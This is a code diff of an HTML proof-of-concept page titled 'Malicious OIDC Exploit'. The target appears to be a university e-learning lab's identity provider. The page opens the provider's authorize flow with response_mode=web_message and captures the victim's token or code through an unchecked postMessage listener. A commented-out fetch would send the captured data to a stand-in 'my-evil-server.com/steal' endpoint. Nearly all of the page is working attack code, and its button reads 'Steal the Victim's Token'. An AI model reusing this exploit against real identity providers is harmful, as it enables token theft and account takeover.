@@ -2,13 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Malicious OIDC Exploit</title>
+  <title>Malicious OIDC Exploit (Raw Text)</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 1em; }
+    body {
+      font-family: Arial, sans-serif;
+      margin: 1em;
+    }
     #tokenLog {
-      margin-top: 1em; 
-      padding: 1em; 
-      background: #f0f0f0; 
+      margin-top: 1em;
+      padding: 1em;
+      background: #f0f0f0;
       border: 1px solid #ccc;
       white-space: pre-wrap;
     }
@@ -17,8 +20,9 @@
 <body>
   <h1>Malicious OIDC Exploit</h1>
   <p>
-    When the victim clicks below, we will open the IdP’s vulnerable login flow.  
-    Because the victim is already authenticated, the IdP will immediately post the token back to us.
+    When the victim clicks below, we open the IdP’s login flow. If they’re already
+    logged in, the IdP might immediately post the token/code back to this page
+    via <code>window.postMessage</code>.
   </p>
   <button id="stealTokenBtn">Steal the Victim’s Token</button>
 
@@ -26,39 +30,42 @@
   <div id="tokenLog">(none yet)</div>
 
   <script>
-    // Replace this URL with the EXACT one from the vulnerable flow (spa-v5).
-    // Make sure you do NOT remove or alter any required parameters like idp_verifier, sp_verifier, sp_id, etc.
+    // Change this URL to match the *exact* vulnerable flow request:
     const authorizeUrl = 
-      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?scope=profile+email+calendar+passwords+photos&response_type=code&redirect_uri=https%3A%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F&state=m-B4YHTo5nHZY-DZGc-NCA&code_challenge_method=S256&client_id=spa-1&code_challenge=WXxb_VtulbAHlWUwN3TNkV98RD3pmpnkJo3jrlhy0jM&response_mode=web_message&idp_verifier=spa-s1"
+      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml" +
+      "?scope=profile+email+calendar+passwords+photos" +
+      "&response_type=code" +
+      "&redirect_uri=https%3A%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F" +
+      "&state=m-B4YHTo5nHZY-DZGc-NCA" +
+      "&code_challenge_method=S256" +
+      "&client_id=spa-1" +
+      "&code_challenge=WXxb_VtulbAHlWUwN3TNkV98RD3pmpnkJo3jrlhy0jM" +
+      "&response_mode=web_message" +
+      "&idp_verifier=spa-s1";
 
-    // When victim clicks the button, open the IdP in a new window.
+    // Open the IdP flow in a new window.
     document.getElementById("stealTokenBtn").addEventListener("click", () => {
       window.open(authorizeUrl, "_blank", "width=800,height=600");
     });
 
-    // Listen for any postMessage events from that new window (the IdP).
+    // Listen for any postMessage events (the IdP might send the token here).
     window.addEventListener("message", function (event) {
-      // NOTE: If the IdP is truly vulnerable, it may postMessage to us with no further checks.
-      // If there is some domain check, you might have to adjust or remove the check below.
       console.log("Got a postMessage event:", event);
 
-      // For debugging: log the origin to see who is sending the message
-      // console.log("Message origin: ", event.origin);
-
-      // If you expect the message to come from the IdP domain, you could check it:
+      // Optionally check event.origin here, if needed:
       // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
-      //   return; 
+      //   return;
       // }
 
-      // The IdP might post an object with { access_token: "...", ... } or just the OAuth code.
+      // Just show the raw data, no JSON parsing:
       const tokenLogDiv = document.getElementById("tokenLog");
-      tokenLogDiv.textContent = "Received message:\n" + JSON.stringify(event.data, null, 2);
+      tokenLogDiv.textContent = "Received message:\n" + event.data;
 
-      // Exfiltrate the token (or code) to your server:
-      // fetch("https://your-evil-server.com/steal", {
+      // If we wanted to exfiltrate it to our server:
+      // fetch("https://my-evil-server.com/steal", {
       //   method: "POST",
-      //   headers: { "Content-Type": "application/json" },
-      //   body: JSON.stringify(event.data)
+      //   headers: { "Content-Type": "text/plain" },
+      //   body: event.data
       // });
     });
   </script>
